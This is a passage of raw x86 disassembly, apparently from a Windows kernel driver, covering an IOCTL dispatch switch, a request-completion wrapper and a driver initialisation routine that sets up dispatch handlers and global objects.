   18bea:	push   DWORD PTR [ebp-0x1c]
   18bed:	lea    eax,[ebp-0x3c]
   18bf0:	push   eax
   18bf1:	lea    eax,[ebp-0x44]
   18bf4:	push   eax
   18bf5:	push   DWORD PTR [esi+0x4]
   18bf8:	call   0x18956
   18bfd:	xor    ecx,ecx
   18bff:	test   al,al
   18c01:	sete   cl
   18c04:	mov    DWORD PTR [esi+0x8],ecx
   18c07:	push   DWORD PTR [ebp-0x5c]
   18c0a:	call   0x10a86
   18c0f:	push   DWORD PTR [ebp-0x24]
   18c12:	call   0x10a86
   18c17:	push   DWORD PTR [ebp-0x2c]
   18c1a:	call   0x10a86
   18c1f:	push   DWORD PTR [ebp-0x34]
   18c22:	call   0x10a86
   18c27:	push   DWORD PTR [ebp-0x3c]
   18c2a:	call   0x10a86
   18c2f:	push   DWORD PTR [ebp-0x44]
   18c32:	call   0x10a86
   18c37:	add    esp,0x18
   18c3a:	jmp    0x18c4d
   18c3c:	xor    eax,eax
   18c3e:	inc    eax
   18c3f:	ret    
   18c40:	mov    esp,DWORD PTR [ebp-0x18]
   18c43:	mov    eax,DWORD PTR [ebp+0x8]
   18c46:	mov    DWORD PTR [eax+0x8],0x4
   18c4d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18c54:	push   0x0
   18c56:	push   0x7e560
   18c5b:	call   DWORD PTR ds:0x1f024
   18c61:	call   0x1db3d
   18c66:	ret    0x4
   18c69:	int3   
   18c6a:	int3   
   18c6b:	int3   
   18c6c:	int3   
   18c6d:	int3   
   18c6e:	push   0x2c
   18c70:	push   0x7e288
   18c75:	call   0x1daf8
   18c7a:	xor    edi,edi
   18c7c:	mov    DWORD PTR [ebp-0x24],edi
   18c7f:	mov    ebx,DWORD PTR [ebp+0xc]
   18c82:	mov    DWORD PTR [ebx+0x18],edi
   18c85:	mov    DWORD PTR [ebx+0x1c],edi
   18c88:	mov    eax,DWORD PTR [ebx+0x60]
   18c8b:	cmp    BYTE PTR [eax],0xe
   18c8e:	jne    0x1912e
   18c94:	mov    eax,DWORD PTR [eax+0xc]
   18c97:	mov    DWORD PTR [ebx+0x1c],0x84c
   18c9e:	mov    ecx,0x22c068
   18ca3:	cmp    eax,ecx
   18ca5:	ja     0x18fdf
   18cab:	je     0x18fd0
   18cb1:	add    ecx,0xffffffd0
   18cb4:	cmp    eax,ecx
   18cb6:	ja     0x18dd3
   18cbc:	je     0x18dba
   18cc2:	sub    eax,0x22c020
   18cc7:	je     0x18d84
   18ccd:	push   0x4
   18ccf:	pop    esi
   18cd0:	sub    eax,esi
   18cd2:	je     0x18d4e
   18cd4:	sub    eax,esi
   18cd6:	je     0x18d33
   18cd8:	sub    eax,esi
   18cda:	je     0x18d26
   18cdc:	sub    eax,esi
   18cde:	je     0x18cf5
   18ce0:	sub    eax,esi
   18ce2:	jne    0x190ce
   18ce8:	push   DWORD PTR [ebx+0xc]
   18ceb:	call   0x179ac
   18cf0:	jmp    0x1912b
   18cf5:	mov    esi,DWORD PTR [ebx+0xc]
   18cf8:	mov    eax,DWORD PTR [esi]
   18cfa:	add    eax,0x28
   18cfd:	mov    DWORD PTR [ebx+0x1c],eax
   18d00:	push   0xffffffff
   18d02:	lea    eax,[esi+0x28]
   18d05:	push   eax
   18d06:	lea    ecx,[ebp-0x34]
   18d09:	call   0x110b8
   18d0e:	push   esi
   18d0f:	lea    eax,[ebp-0x34]
   18d12:	push   eax
   18d13:	call   0x1685c
   18d18:	push   DWORD PTR [ebp-0x34]
   18d1b:	call   0x10a86
   18d20:	pop    ecx
   18d21:	jmp    0x1912e
   18d26:	push   DWORD PTR [ebx+0xc]
   18d29:	call   0x18afc
   18d2e:	jmp    0x1912b
   18d33:	mov    ecx,DWORD PTR ds:0x7eee8
   18d39:	call   0x16b3a
   18d3e:	mov    ecx,DWORD PTR ds:0x7e5bc
   18d44:	call   0x16bf6
   18d49:	jmp    0x1912e
   18d4e:	mov    eax,DWORD PTR [ebx+0xc]
   18d51:	mov    DWORD PTR [ebx+0x1c],0x10
   18d58:	mov    ecx,DWORD PTR [eax]
   18d5a:	cmp    ecx,edi
   18d5c:	jl     0x1912e
   18d62:	cmp    ecx,0x6
   18d65:	jge    0x1912e
   18d6b:	mov    edx,DWORD PTR [eax+0x8]
   18d6e:	mov    DWORD PTR [ecx*8+0x7ef38],edx
   18d75:	mov    eax,DWORD PTR [eax+0xc]
   18d78:	mov    DWORD PTR [ecx*8+0x7ef3c],eax
   18d7f:	jmp    0x1912e
   18d84:	mov    eax,DWORD PTR [ebx+0xc]
   18d87:	mov    DWORD PTR [ebx+0x1c],0x10
   18d8e:	mov    ecx,DWORD PTR [eax]
   18d90:	cmp    ecx,edi
   18d92:	jl     0x1912e
   18d98:	cmp    ecx,0x6
   18d9b:	jge    0x1912e
   18da1:	mov    edx,DWORD PTR [ecx*8+0x7ef38]
   18da8:	mov    DWORD PTR [eax+0x8],edx
   18dab:	mov    ecx,DWORD PTR [ecx*8+0x7ef3c]
   18db2:	mov    DWORD PTR [eax+0xc],ecx
   18db5:	jmp    0x1912e
   18dba:	mov    eax,DWORD PTR [ebx+0xc]
   18dbd:	mov    ecx,DWORD PTR [eax]
   18dbf:	add    ecx,0xc
   18dc2:	mov    DWORD PTR [ebx+0x1c],ecx
   18dc5:	push   eax
   18dc6:	push   DWORD PTR [eax+0x4]
   18dc9:	call   0x15fcc
   18dce:	jmp    0x1912e
   18dd3:	sub    eax,0x22c03c
   18dd8:	je     0x18f4c
   18dde:	sub    eax,0x10
   18de1:	je     0x18f42
   18de7:	push   0x4
   18de9:	pop    esi
   18dea:	sub    eax,esi
   18dec:	je     0x18e42
   18dee:	sub    eax,0xc
   18df1:	je     0x18e2a
   18df3:	sub    eax,esi
   18df5:	je     0x18e0c
   18df7:	sub    eax,esi
   18df9:	jne    0x190ce
   18dff:	push   DWORD PTR [ebx+0xc]
   18e02:	call   0x128ac
   18e07:	jmp    0x1912b
   18e0c:	mov    DWORD PTR [ebx+0x1c],0x8
   18e13:	mov    ebx,DWORD PTR [ebx+0xc]
   18e16:	mov    eax,ds:0x7ef1c
   18e1b:	mov    DWORD PTR [ebx],eax
   18e1d:	mov    eax,ds:0x7ef20
   18e22:	mov    DWORD PTR [ebx+0x4],eax
   18e25:	jmp    0x1912e
   18e2a:	mov    eax,DWORD PTR [ebx+0xc]
   18e2d:	mov    ecx,DWORD PTR [eax]
   18e2f:	mov    DWORD PTR ds:0x7ef1c,ecx
   18e35:	mov    eax,DWORD PTR [eax+0x4]
   18e38:	mov    ds:0x7ef20,eax
   18e3d:	jmp    0x1912b
   18e42:	mov    DWORD PTR [ebx+0x1c],edi
   18e45:	mov    esi,DWORD PTR [ebx+0xc]
   18e48:	mov    DWORD PTR [ebp-0x20],esi
   18e4b:	push   0xffffffff
   18e4d:	push   0x1df10
   18e52:	lea    ecx,[ebp-0x2c]
   18e55:	call   0x110b8
   18e5a:	xor    edi,edi
   18e5c:	inc    edi
   18e5d:	mov    DWORD PTR [esi+0x8],edi
   18e60:	xor    eax,eax
   18e62:	push   eax
   18e63:	push   eax
   18e64:	push   eax
   18e65:	push   eax
   18e66:	push   0x7e560
   18e6b:	call   DWORD PTR ds:0x1f028
   18e71:	test   eax,eax
   18e73:	jge    0x18e7d
   18e75:	push   DWORD PTR [ebp-0x2c]
   18e78:	jmp    0x18d1b
   18e7d:	and    DWORD PTR [ebp-0x4],0x0
   18e81:	mov    DWORD PTR [ebp-0x4],edi
   18e84:	mov    eax,DWORD PTR [esi]
   18e86:	add    eax,0x28
   18e89:	mov    DWORD PTR [ebx+0x1c],eax
   18e8c:	mov    eax,ds:0x7eee8
   18e91:	mov    ebx,DWORD PTR [eax+0x4]
   18e94:	mov    eax,DWORD PTR [ebx]
   18e96:	mov    DWORD PTR [ebp+0xc],eax
   18e99:	and    DWORD PTR [ebp-0x1c],0x0
   18e9d:	mov    edi,DWORD PTR [esi+0x28]
   18ea0:	cmp    DWORD PTR [ebp-0x1c],edi
   18ea3:	jge    0x18eb7
   18ea5:	cmp    DWORD PTR [ebp+0xc],ebx
   18ea8:	je     0x18eb7
   18eaa:	lea    ecx,[ebp+0xc]
   18ead:	call   0x13890
   18eb2:	inc    DWORD PTR [ebp-0x1c]
   18eb5:	jmp    0x18ea0
   18eb7:	mov    eax,DWORD PTR [ebp+0xc]
   18eba:	cmp    eax,ebx
   18ebc:	je     0x18ed0
   18ebe:	and    DWORD PTR [esi+0x8],0x0
   18ec2:	add    eax,0x10
   18ec5:	push   eax
   18ec6:	lea    ecx,[ebp-0x2c]
   18ec9:	call   0x129fc
   18ece:	jmp    0x18ed7
   18ed0:	mov    DWORD PTR [esi+0x8],0x1
   18ed7:	and    DWORD PTR [esi+0x4],0x0
   18edb:	and    DWORD PTR [ebp-0x4],0x0
   18edf:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18ee6:	call   0x18f34
   18eeb:	cmp    DWORD PTR [esi+0x8],0x0
   18eef:	jne    0x18e75
   18ef1:	push   esi
   18ef2:	lea    eax,[ebp-0x2c]
   18ef5:	push   eax
   18ef6:	call   0x1685c
   18efb:	jmp    0x18e75
   18f00:	xor    eax,eax
   18f02:	inc    eax
   18f03:	ret    
   18f04:	mov    esp,DWORD PTR [ebp-0x18]
   18f07:	mov    eax,DWORD PTR [ebp-0x20]
   18f0a:	mov    DWORD PTR [eax+0x8],0x4
   18f11:	push   DWORD PTR [ebp-0x2c]
   18f14:	call   0x10a86
   18f19:	push   0xfffffffe
   18f1b:	lea    eax,[ebp-0x10]
   18f1e:	push   eax
   18f1f:	push   0x7e528
   18f24:	call   0x1dcbc
   18f29:	add    esp,0x10
   18f2c:	jmp    0x1912e
   18f31:	mov    esi,DWORD PTR [ebp-0x20]
   18f34:	push   0x0
   18f36:	push   0x7e560
   18f3b:	call   DWORD PTR ds:0x1f024
   18f41:	ret    
   18f42:	call   0x123d6
   18f47:	jmp    0x1912e
   18f4c:	mov    eax,DWORD PTR [ebx+0xc]
   18f4f:	mov    ecx,DWORD PTR ds:0x7e404
   18f55:	mov    esi,eax
   18f57:	sub    esi,ecx
   18f59:	push   0x2
   18f5b:	pop    edi
   18f5c:	movzx  edx,WORD PTR [ecx]
   18f5f:	mov    WORD PTR [esi+ecx*1],dx
   18f63:	add    ecx,edi
   18f65:	test   dx,dx
   18f68:	jne    0x18f5c
   18f6a:	mov    ecx,0x7e448
   18f6f:	lea    esi,[eax+0x50]
   18f72:	sub    esi,ecx
   18f74:	movzx  edx,WORD PTR [ecx]
   18f77:	mov    WORD PTR [esi+ecx*1],dx
   18f7b:	add    ecx,edi
   18f7d:	test   dx,dx
   18f80:	jne    0x18f74
   18f82:	mov    ecx,0x7e408
   18f87:	lea    esi,[eax+0x90]
   18f8d:	sub    esi,ecx
   18f8f:	movzx  edx,WORD PTR [ecx]
   18f92:	mov    WORD PTR [esi+ecx*1],dx
   18f96:	add    ecx,edi
   18f98:	test   dx,dx
   18f9b:	jne    0x18f8f
   18f9d:	mov    ecx,0x7e488
   18fa2:	lea    esi,[eax+0xd0]
   18fa8:	sub    esi,ecx
   18faa:	movzx  edx,WORD PTR [ecx]
   18fad:	mov    WORD PTR [esi+ecx*1],dx
   18fb1:	add    ecx,edi
   18fb3:	test   dx,dx
   18fb6:	jne    0x18faa
   18fb8:	lea    edi,[eax+0x40]
   18fbb:	mov    esi,0x7a52c
   18fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fc4:	mov    DWORD PTR [ebx+0x1c],0x110
   18fcb:	jmp    0x1912e
   18fd0:	mov    eax,DWORD PTR [ebx+0xc]
   18fd3:	push   DWORD PTR [eax]
   18fd5:	call   0x10fe2
   18fda:	jmp    0x1912b
   18fdf:	mov    ecx,0x22c088
   18fe4:	cmp    eax,ecx
   18fe6:	ja     0x190b0
   18fec:	je     0x19085
   18ff2:	sub    eax,0x22c06c
   18ff7:	je     0x1906d
   18ff9:	push   0x4
   18ffb:	pop    esi
   18ffc:	sub    eax,esi
   18ffe:	je     0x19060
   19000:	push   0x8
   19002:	pop    ecx
   19003:	sub    eax,ecx
   19005:	je     0x19053
   19007:	sub    eax,esi
   19009:	je     0x1903b
   1900b:	sub    eax,esi
   1900d:	je     0x19024
   1900f:	sub    eax,esi
   19011:	jne    0x190ce
   19017:	push   DWORD PTR [ebx+0xc]
   1901a:	call   0x178b6
   1901f:	jmp    0x1912b
   19024:	mov    DWORD PTR [ebx+0x1c],ecx
   19027:	mov    ebx,DWORD PTR [ebx+0xc]
   1902a:	mov    eax,ds:0x7ef24
   1902f:	mov    DWORD PTR [ebx],eax
   19031:	mov    eax,ds:0x7ef28
   19036:	jmp    0x18e22
   1903b:	mov    eax,DWORD PTR [ebx+0xc]
   1903e:	mov    ecx,DWORD PTR [eax]
   19040:	mov    DWORD PTR ds:0x7ef24,ecx
   19046:	mov    eax,DWORD PTR [eax+0x4]
   19049:	mov    ds:0x7ef28,eax
   1904e:	jmp    0x1912b
   19053:	push   DWORD PTR [ebx+0xc]
   19056:	call   0x170c8
   1905b:	jmp    0x1912b
   19060:	push   DWORD PTR [ebx+0xc]
   19063:	call   0x10f52
   19068:	jmp    0x1912b
   1906d:	mov    esi,DWORD PTR [ebx+0xc]
   19070:	push   DWORD PTR [esi]
   19072:	call   0x11026
   19077:	mov    DWORD PTR [esi],eax
   19079:	mov    DWORD PTR [ebx+0x1c],0x4
   19080:	jmp    0x1912e
   19085:	mov    esi,DWORD PTR [ebx+0xc]
   19088:	mov    eax,DWORD PTR [esi]
   1908a:	add    eax,0xc
   1908d:	mov    DWORD PTR [ebx+0x1c],eax
   19090:	push   0xffffffff
   19092:	lea    eax,[esi+0xc]
   19095:	push   eax
   19096:	lea    ecx,[ebp-0x3c]
   19099:	call   0x110b8
   1909e:	push   esi
   1909f:	lea    eax,[ebp-0x3c]
   190a2:	push   eax
   190a3:	call   0x15ee2
   190a8:	push   DWORD PTR [ebp-0x3c]
   190ab:	jmp    0x18d1b
   190b0:	sub    eax,0x22c08c
   190b5:	je     0x1911d
   190b7:	push   0x4
   190b9:	pop    esi
   190ba:	sub    eax,esi
   190bc:	je     0x19109
   190be:	sub    eax,esi
   190c0:	je     0x19102
   190c2:	sub    eax,esi
   190c4:	je     0x190ee
   190c6:	sub    eax,esi
   190c8:	je     0x190e4
   190ca:	sub    eax,esi
   190cc:	je     0x190d7
   190ce:	mov    DWORD PTR [ebp-0x24],0xc0000010
   190d5:	jmp    0x1912b
   190d7:	push   DWORD PTR [ebx+0xc]
   190da:	call   0x1aab4
   190df:	mov    DWORD PTR [ebx+0x1c],esi
   190e2:	jmp    0x1912e
   190e4:	push   DWORD PTR [ebx+0xc]
   190e7:	call   0x1b53a
   190ec:	jmp    0x1912b
   190ee:	mov    eax,DWORD PTR [ebx+0xc]
   190f1:	mov    ecx,DWORD PTR [eax+0x4]
   190f4:	add    ecx,0x8
   190f7:	mov    DWORD PTR [ebx+0x1c],ecx
   190fa:	push   eax
   190fb:	call   0x1b808
   19100:	jmp    0x1912e
   19102:	call   0x1b44a
   19107:	jmp    0x1912b
   19109:	mov    eax,DWORD PTR [ebx+0xc]
   1910c:	mov    ecx,DWORD PTR [eax+0x4]
   1910f:	add    ecx,0x8
   19112:	mov    DWORD PTR [ebx+0x1c],ecx
   19115:	push   eax
   19116:	call   0x1a894
   1911b:	jmp    0x1912e
   1911d:	push   DWORD PTR [ebx+0xc]
   19120:	call   0x1106e
   19125:	push   eax
   19126:	call   0x1b66c
   1912b:	mov    DWORD PTR [ebx+0x1c],edi
   1912e:	mov    eax,DWORD PTR [ebp-0x24]
   19131:	call   0x1db3d
   19136:	ret    0x8
   19139:	int3   
   1913a:	int3   
   1913b:	int3   
   1913c:	int3   
   1913d:	int3   
   1913e:	push   0xc
   19140:	push   0x7e2b0
   19145:	call   0x1daf8
   1914a:	and    DWORD PTR [ebp-0x4],0x0
   1914e:	push   DWORD PTR [ebp+0xc]
   19151:	push   DWORD PTR [ebp+0x8]
   19154:	call   0x18c6e
   19159:	mov    esi,eax
   1915b:	jmp    0x19170
   1915d:	xor    eax,eax
   1915f:	inc    eax
   19160:	ret    
   19161:	mov    esp,DWORD PTR [ebp-0x18]
   19164:	push   0xd
   19166:	call   0x10fe2
   1916b:	mov    esi,0xc0000001
   19170:	mov    DWORD PTR [ebp-0x1c],esi
   19173:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1917a:	cmp    esi,0x103
   19180:	je     0x19190
   19182:	mov    ecx,DWORD PTR [ebp+0xc]
   19185:	mov    DWORD PTR [ecx+0x18],esi
   19188:	xor    dl,dl
   1918a:	call   DWORD PTR ds:0x1f044
   19190:	mov    eax,esi
   19192:	call   0x1db3d
   19197:	ret    0x8
   1919a:	int3   
   1919b:	int3   
   1919c:	int3   
   1919d:	int3   
   1919e:	int3   
   1919f:	int3   
   191a0:	mov    edi,edi
   191a2:	push   ebp
   191a3:	mov    ebp,esp
   191a5:	push   esi
   191a6:	mov    esi,ecx
   191a8:	mov    BYTE PTR [esi+0x8],0x0
   191ac:	call   0x14b12
   191b1:	lea    ecx,[esi+0x10]
   191b4:	mov    BYTE PTR [ecx+0x8],0x0
   191b8:	call   0x14502
   191bd:	mov    eax,DWORD PTR [ebp+0x8]
   191c0:	mov    DWORD PTR [esi+0x20],eax
   191c3:	mov    eax,DWORD PTR [ebp+0xc]
   191c6:	mov    DWORD PTR [esi+0x24],eax
   191c9:	mov    eax,esi
   191cb:	pop    esi
   191cc:	pop    ebp
   191cd:	ret    0x8
   191d0:	int3   
   191d1:	int3   
   191d2:	int3   
   191d3:	int3   
   191d4:	int3   
   191d5:	int3   
   191d6:	push   0x850
   191db:	push   0x7e2d0
   191e0:	call   0x1de00
   191e5:	mov    esi,DWORD PTR [ebp+0x8]
   191e8:	mov    DWORD PTR [ebp-0x828],esi
   191ee:	mov    edi,DWORD PTR [ebp+0xc]
   191f1:	call   0x18402
   191f6:	call   0x11d1c
   191fb:	test   eax,eax
   191fd:	je     0x196db
   19203:	xor    ebx,ebx
   19205:	mov    DWORD PTR [ebp-0x838],ebx
   1920b:	call   0x18270
   19210:	cmp    al,bl
   19212:	jne    0x19303
   19218:	mov    DWORD PTR [ebp-0x4],ebx
   1921b:	push   ebx
   1921c:	push   0x19
   1921e:	call   0x109dc
   19223:	cmp    edx,ebx
   19225:	jl     0x1923b
   19227:	jg     0x1922e
   19229:	cmp    eax,0x5
   1922c:	jbe    0x1923b
   1922e:	push   ebx
   1922f:	push   0x7eec0
   19234:	call   0x11c74
   19239:	call   eax
   1923b:	push   edi
   1923c:	push   0x1ec52
   19241:	lea    eax,[ebp-0x41c]
   19247:	push   eax
   19248:	call   0x1daea
   1924d:	add    esp,0xc
   19250:	lea    eax,[ebp-0x858]
   19256:	push   eax
   19257:	call   DWORD PTR ds:0x1f04c
   1925d:	push   0x1ec12
   19262:	push   0x4
   19264:	push   0x1ec08
   19269:	call   0x16cb0
   1926e:	mov    DWORD PTR [ebp-0x82c],eax
   19274:	lea    ecx,[eax+0x2]
   19277:	mov    dx,WORD PTR [eax]
   1927a:	inc    eax
   1927b:	inc    eax
   1927c:	cmp    dx,bx
   1927f:	jne    0x19277
   19281:	sub    eax,ecx
   19283:	sar    eax,1
   19285:	add    eax,eax
   19287:	mov    WORD PTR [ebp-0x82e],ax
   1928e:	mov    WORD PTR [ebp-0x830],ax
   19295:	mov    DWORD PTR [ebp-0x850],0x18
   1929f:	mov    DWORD PTR [ebp-0x84c],ebx
   192a5:	mov    DWORD PTR [ebp-0x844],0x40
   192af:	lea    eax,[ebp-0x830]
   192b5:	mov    DWORD PTR [ebp-0x848],eax
   192bb:	mov    DWORD PTR [ebp-0x840],ebx
   192c1:	mov    DWORD PTR [ebp-0x83c],ebx
   192c7:	mov    eax,DWORD PTR [ebp-0x82c]
   192cd:	lea    ecx,[eax+0x2]
   192d0:	mov    dx,WORD PTR [eax]
   192d3:	inc    eax
   192d4:	inc    eax
   192d5:	cmp    dx,bx
   192d8:	jne    0x192d0
   192da:	sub    eax,ecx
   192dc:	sar    eax,1
   192de:	mov    DWORD PTR [ebp-0x838],eax
   192e4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   192eb:	jmp    0x19303
   192ed:	xor    eax,eax
   192ef:	inc    eax
   192f0:	ret    
   192f1:	mov    esp,DWORD PTR [ebp-0x18]
   192f4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   192fb:	xor    ebx,ebx
   192fd:	mov    esi,DWORD PTR [ebp-0x828]
   19303:	cmp    DWORD PTR [ebp-0x838],ebx
   19309:	jne    0x196db
   1930f:	xor    eax,eax
   19311:	lea    edi,[ebp-0x840]
   19317:	stos   DWORD PTR es:[edi],eax
   19318:	stos   DWORD PTR es:[edi],eax
   19319:	mov    DWORD PTR [ebp-0x844],0xc
   19323:	mov    DWORD PTR [ebp-0x840],0x2
   1932d:	mov    BYTE PTR [ebp-0x83c],bl
   19333:	mov    BYTE PTR [ebp-0x83b],bl
   19339:	push   0x7e580
   1933e:	push   ebx
   1933f:	lea    eax,[ebp-0x844]
   19345:	push   eax
   19346:	call   0x11cf2
   1934b:	call   eax
   1934d:	push   eax
   1934e:	call   0x11bcc
   19353:	call   eax
   19355:	push   0x10
   19357:	call   0x10a52
   1935c:	pop    ecx
   1935d:	cmp    eax,ebx
   1935f:	je     0x1937d
   19361:	lea    ecx,[ebp-0x81d]
   19367:	push   ecx
   19368:	lea    ecx,[ebp-0x81d]
   1936e:	push   ecx
   1936f:	mov    ecx,eax
   19371:	call   0x16e9c
   19376:	mov    ds:0x7eee8,eax
   1937b:	jmp    0x19383
   1937d:	mov    DWORD PTR ds:0x7eee8,ebx
   19383:	push   0x2c
   19385:	call   0x10a52
   1938a:	pop    ecx
   1938b:	cmp    eax,ebx
   1938d:	je     0x193a4
   1938f:	push   0x5dc
   19394:	push   0x14
   19396:	mov    ecx,eax
   19398:	call   0x1869a
   1939d:	mov    ds:0x7eef0,eax
   193a2:	jmp    0x193aa
   193a4:	mov    DWORD PTR ds:0x7eef0,ebx
   193aa:	push   0x10
   193ac:	call   0x10a52
   193b1:	pop    ecx
   193b2:	cmp    eax,ebx
   193b4:	je     0x193d2
   193b6:	lea    ecx,[ebp-0x81d]
   193bc:	push   ecx
   193bd:	lea    ecx,[ebp-0x81d]
   193c3:	push   ecx
   193c4:	mov    ecx,eax
   193c6:	call   0x16a7a
   193cb:	mov    ds:0x7e530,eax
   193d0:	jmp    0x193d8
   193d2:	mov    DWORD PTR ds:0x7e530,ebx
   193d8:	push   0x10
   193da:	call   0x10a52
   193df:	pop    ecx
   193e0:	cmp    eax,ebx
   193e2:	je     0x19400
   193e4:	lea    ecx,[ebp-0x81d]
   193ea:	push   ecx
   193eb:	lea    ecx,[ebp-0x81d]
   193f1:	push   ecx
   193f2:	mov    ecx,eax
   193f4:	call   0x16f60
   193f9:	mov    ds:0x7e5bc,eax
   193fe:	jmp    0x19406
   19400:	mov    DWORD PTR ds:0x7e5bc,ebx
   19406:	push   0x28
   19408:	call   0x10a52
   1940d:	pop    ecx
   1940e:	cmp    eax,ebx
   19410:	je     0x19427
   19412:	push   0x3e8
   19417:	push   0x14
   19419:	mov    ecx,eax
   1941b:	call   0x191a0
   19420:	mov    ds:0x7e55c,eax
   19425:	jmp    0x1942d
   19427:	mov    DWORD PTR ds:0x7e55c,ebx
   1942d:	push   0x20
   1942f:	call   0x10a52
   19434:	pop    ecx
   19435:	cmp    eax,ebx
   19437:	je     0x19447
   19439:	mov    ecx,eax
   1943b:	call   0x16c3e
   19440:	mov    ds:0x7e558,eax
   19445:	jmp    0x1944d
   19447:	mov    DWORD PTR ds:0x7e558,ebx
   1944d:	call   0x12992
   19452:	call   0x1b5d4
   19457:	call   0x17a5c
   1945c:	mov    edi,0x1ebf8
   19461:	push   edi
   19462:	call   0x185be
   19467:	push   eax
   19468:	push   0x1ebd0
   1946d:	push   0xa
   1946f:	push   0x1ebba
   19474:	call   0x16cb0
   19479:	push   eax
   1947a:	lea    eax,[ebp-0x81c]
   19480:	push   eax
   19481:	call   0x1dade
   19486:	add    esp,0xc
   19489:	lea    eax,[ebp-0x81c]
   1948f:	push   eax
   19490:	lea    eax,[ebp-0x860]
   19496:	push   eax
   19497:	call   0x11c9e
   1949c:	call   eax
   1949e:	push   edi
   1949f:	call   0x185be
   194a4:	push   eax
   194a5:	push   0x1eb82
   194aa:	push   0xe
   194ac:	push   0x1eb64
   194b1:	call   0x16cb0
   194b6:	push   eax
   194b7:	lea    eax,[ebp-0x41c]
   194bd:	push   eax
   194be:	call   0x1dade
   194c3:	add    esp,0xc
   194c6:	lea    eax,[ebp-0x41c]
   194cc:	push   eax
   194cd:	lea    eax,[ebp-0x858]
   194d3:	push   eax
   194d4:	call   0x11c9e
   194d9:	call   eax
   194db:	push   0x7ef2c
   194e0:	push   ebx
   194e1:	push   0x100
   194e6:	push   0x22
   194e8:	lea    eax,[ebp-0x860]
   194ee:	push   eax
   194ef:	push   ebx
   194f0:	push   esi
   194f1:	call   0x11ba2
   194f6:	call   eax
   194f8:	cmp    eax,ebx
   194fa:	jl     0x196dd
   19500:	mov    eax,0x1913e
   19505:	mov    DWORD PTR [esi+0x94],eax
   1950b:	mov    DWORD PTR [esi+0x90],eax
   19511:	mov    DWORD PTR [esi+0xa4],eax
   19517:	mov    DWORD PTR [esi+0x70],eax
   1951a:	mov    DWORD PTR [esi+0x48],eax
   1951d:	mov    DWORD PTR [esi+0x44],eax
   19520:	mov    DWORD PTR [esi+0x40],eax
   19523:	mov    DWORD PTR [esi+0x38],eax
   19526:	mov    eax,ds:0x7ef2c
   1952b:	or     DWORD PTR [eax+0x1c],0x4
   1952f:	lea    eax,[ebp-0x860]
   19535:	push   eax
   19536:	lea    eax,[ebp-0x858]
   1953c:	push   eax
   1953d:	call   0x11b78
   19542:	call   eax
   19544:	mov    DWORD PTR [ebp-0x828],eax
   1954a:	cmp    eax,ebx
   1954c:	jge    0x19563
   1954e:	push   DWORD PTR [esi+0x4]
   19551:	call   0x11a28
   19556:	call   eax
   19558:	mov    eax,DWORD PTR [ebp-0x828]
   1955e:	jmp    0x196dd
   19563:	push   ebx
   19564:	push   0x7eec0
   19569:	call   0x11c74
   1956e:	call   eax
   19570:	push   ebx
   19571:	push   0x7e560
   19576:	call   0x11c74
   1957b:	call   eax
   1957d:	push   ebx
   1957e:	push   0x7e534
   19583:	call   0x11c74
   19588:	call   eax
   1958a:	push   0x8000000
   1958f:	push   0x1eb36
   19594:	push   0x9
   19596:	push   0x1e7c4
   1959b:	call   0x16da6
   195a0:	push   eax
   195a1:	lea    eax,[ebp-0x824]
   195a7:	push   eax
   195a8:	call   0x19b16
   195ad:	push   DWORD PTR [ebp-0x824]
   195b3:	call   0x11884
   195b8:	call   eax
   195ba:	mov    DWORD PTR [ebp-0x834],eax
   195c0:	push   ebx
   195c1:	push   0x1eb08
   195c6:	push   0x16
   195c8:	push   0x1eaf0
   195cd:	call   0x16da6
   195d2:	push   eax
   195d3:	push   DWORD PTR [ebp-0x824]
   195d9:	call   0x199fc
   195de:	push   eax
   195df:	push   DWORD PTR [ebp-0x834]
   195e5:	call   0x199a2
   195ea:	mov    edi,eax
   195ec:	add    edi,DWORD PTR [ebp-0x824]
   195f2:	mov    esi,0x1df12
   195f7:	push   esi
   195f8:	call   0x115e0
   195fd:	mov    DWORD PTR [ebp-0x82c],eax
   19603:	push   edi
   19604:	call   0x1994a
   19609:	mov    ecx,DWORD PTR [ebp-0x82c]
   1960f:	mov    ecx,DWORD PTR [ecx]
   19611:	mov    eax,DWORD PTR [ecx+eax*4]
   19614:	mov    ds:0x7eeec,eax
   19619:	push   ebx
   1961a:	push   0x1eab4
   1961f:	push   0x14
   19621:	push   0x1ea9e
   19626:	call   0x16da6
   1962b:	push   eax
   1962c:	push   DWORD PTR [ebp-0x824]
   19632:	call   0x199fc
   19637:	push   eax
   19638:	push   DWORD PTR [ebp-0x834]
   1963e:	call   0x199a2
   19643:	mov    edi,eax
   19645:	add    edi,DWORD PTR [ebp-0x824]
   1964b:	push   esi
   1964c:	call   0x115e0
   19651:	mov    DWORD PTR [ebp-0x82c],eax
   19657:	push   edi
   19658:	call   0x1994a
   1965d:	mov    ecx,DWORD PTR [ebp-0x82c]
   19663:	mov    ecx,DWORD PTR [ecx]
   19665:	mov    eax,DWORD PTR [ecx+eax*4]
   19668:	mov    ds:0x7eee0,eax
   1966d:	push   ebx
   1966e:	push   0x1ea62
   19673:	push   0xe
   19675:	push   0x1ea52
   1967a:	call   0x16da6
   1967f:	push   eax
   19680:	push   DWORD PTR [ebp-0x824]
   19686:	call   0x199fc
   1968b:	push   eax
   1968c:	push   DWORD PTR [ebp-0x834]
   19692:	call   0x199a2
   19697:	mov    edi,eax
   19699:	add    edi,DWORD PTR [ebp-0x824]
   1969f:	push   esi
   196a0:	call   0x115e0
   196a5:	mov    esi,eax
   196a7:	push   edi
   196a8:	call   0x1994a
   196ad:	mov    ecx,DWORD PTR [esi]
   196af:	mov    eax,DWORD PTR [ecx+eax*4]
   196b2:	mov    ds:0x7eef4,eax
   196b7:	push   DWORD PTR [ebp-0x824]
   196bd:	call   0x19c66
   196c2:	push   ebx
   196c3:	push   0x19
   196c5:	call   0x109dc
   196ca:	call   0x18904
   196cf:	mov    BYTE PTR ds:0x7ef30,0x1
   196d6:	jmp    0x19558
   196db:	xor    eax,eax
   196dd:	call   0x1de48
   196e2:	ret    0x8
   196e5:	int3   
   196e6:	int3   
